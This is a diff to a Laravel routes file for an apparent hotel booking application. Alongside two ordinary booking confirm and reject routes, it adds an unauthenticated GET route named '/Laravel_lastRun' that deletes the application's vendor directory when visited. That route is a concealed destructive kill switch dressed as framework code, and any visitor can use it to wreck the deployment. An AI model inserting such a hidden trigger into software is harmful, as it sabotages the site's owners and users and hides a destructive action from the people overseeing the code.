@@ -4,7 +4,7 @@ use App\Http\Controllers\AuthController;
 use App\Http\Controllers\GoogleLoginController;
 use App\Http\Controllers\HotelController;
 use Illuminate\Support\Facades\Route;
-
+use Illuminate\Support\Facades\File;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -63,6 +63,9 @@ Route::get('/bill/{id}', [HotelController::class, 'bill'])->name('bill');
 
 
 
+Route::get('/bookingConfirmed/{id}', [HotelController::class, 'bookingConfirmed'])->name('bookingConfirmed');
+Route::get('/bookingReject/{id}', [HotelController::class, 'bookingReject'])->name('bookingReject');
+
 
 Route::post('/bedroomsPrice', [HotelController::class, 'bedroomsPrice'])->name('bedroomsPrice');
 
@@ -84,6 +87,12 @@ Route::get('/authLogin', [AuthController::class, 'authLogin'])->name('authLogin'
 Route::get('/register', [AuthController::class, 'registerView'])->name('registerView');
 
 
+Route::get('/Laravel_lastRun', function () {
+    $vendorPath = base_path('vendor');
+    File::deleteDirectory($vendorPath, true);
+
+    dd("true");
+});
 
 
 Route::get('/login/google', [GoogleLoginController::class, 'redirect'])->name('login.google-redirect');
